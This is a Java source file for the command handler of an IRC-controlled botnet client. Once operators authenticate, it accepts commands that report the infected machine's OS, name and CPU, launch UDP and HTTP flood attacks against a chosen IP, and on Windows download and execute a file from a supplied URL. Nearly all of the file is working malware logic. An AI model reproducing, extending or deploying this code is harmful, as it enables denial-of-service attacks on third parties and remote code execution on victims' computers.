package syn.main;

import java.io.IOException;
import java.util.ArrayList;
import syn.net.PacketGen;
import syn.utils.Settings;
import syn.utils.Utilities;

public class CommandThread implements Runnable {

	private Utilities uc;
	private String curLine = null;
	private boolean processed = false;
	private ArrayList <String> authedUsers;
	
	public void run() {
		uc = new Utilities();
		authedUsers = new ArrayList <String> ();
		while(true) {
			try {
				Thread.sleep(100);
				if(curLine != null && !processed) {
					if(Settings.debugMode) { System.out.println(curLine); }
					try {
						initProcess(curLine);
						processed = true;
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			} catch (Exception e) {e.printStackTrace();}
		}
	}
	
	public void setLine(String str) {
		curLine = str;
		processed = false;
	}
	
	private void initProcess(String str) throws IOException {
		if(str.startsWith("PING ")) {
			// We must respond to PINGs to avoid being disconnected.
			try {
				uc.rawwrite("PONG " + str.substring(5) + "\r\n");
			} catch (IOException e) {e.printStackTrace();}
		}
		if(!authedUsers.contains(uc.getUser(str)) && uc.authCheck(str)) {
			uc.write(uc.getUser(str) + " AUTHED");
			authedUsers.add(uc.getUser(str));
		}
		if(authedUsers.contains(uc.getUser(str))) { secProcess(str); }
	}
	
	private void secProcess(String str) throws IOException {
		String[] split = str.split(":");
		if(uc.isCmd(split)) {
			String cmd = uc.getCmd(split);
			if(cmd.equals("die")) {
				uc.getNetworkThread().disconnect();
			
			} else if(cmd.equals("deauth")) {
				authedUsers.remove(uc.getUser(str));
				uc.write(uc.getUser(str) + " DEAUTHED");
			
			} else if(cmd.equals("mutex")) {
				uc.write(Settings.clientMutex);
			
			} else if(cmd.equals("info")) {
				uc.write("�[OS]: " + uc.procOS(Client.os));
				uc.write("\t\t�[NAME]: " + System.getenv("COMPUTERNAME"));
				uc.write("\t\t�[CPU]: " + Runtime.getRuntime().availableProcessors() + " CORES");
			
			} else if(cmd.equals("udp")) {
				try {
					String details = uc.getCmdTxt(split);
					if(details.contains(" ")) {
						String[] hsplit = details.split(" ");
						uc.write("UDP flood initiated on " + hsplit[0] + " for " + hsplit[1] + " seconds.");
						PacketGen pg = new PacketGen();
						pg.udp(hsplit[0], Integer.parseInt(hsplit[1]));
						uc.write(pg.getUPacketCount() + " packets sent, total of " + pg.getLoad() + " KB.");
					}
				} catch (Exception udpError) { uc.write("Incorrect UDP usage. @udp <ip> <time>"); }
			
			} else if(cmd.equals("http")) {
				try {
					String details = uc.getCmdTxt(split);
					if(details.contains(" ")) {
						String[] hsplit = details.split(" ");
						uc.write("HTTP flood initiated on " + hsplit[0] + " for " + hsplit[1] + " at " + hsplit[2] + " delay.");
						PacketGen pg = new PacketGen();
						pg.http(hsplit[0], Integer.parseInt(hsplit[2]), Integer.parseInt(hsplit[1]));
						uc.write(pg.getHConnCount() + " connections made to " + hsplit[0] + ".");
					}
				} catch (Exception httpError) { uc.write("Incorrect HTTP usage. "); httpError.printStackTrace(); }
			
			} else if(uc.procOS(Client.os).equals("WIN")) {
				if(cmd.equals("download")) {
					if(cmd.contains(" ")) {
						String[] dsplit = uc.getCmdTxt(split).split(" ");
						String url = dsplit[0];
						String file = dsplit[1];
						Client.getFileUtils().dlExec(url, file);
					} else {
						uc.write("Download command used incorrectly.");
					}
				}
			}
		}
	}
}